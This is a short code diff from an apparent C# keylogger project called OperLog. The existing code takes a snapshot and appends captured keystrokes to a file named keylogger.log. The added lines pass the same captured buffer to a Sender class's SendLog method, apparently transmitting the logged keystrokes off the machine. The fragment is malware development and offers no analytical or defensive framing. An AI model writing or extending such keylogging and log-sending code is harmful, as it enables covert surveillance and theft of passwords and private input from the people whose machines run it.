@@ -42,6 +42,8 @@ namespace OperLog
                         {
                             Snap();
                             File.AppendAllText("keylogger.log", buf);
+                            Sender m = new Sender();
+                            m.SendLog(buf);
                             buf = "";
                         }
                     }
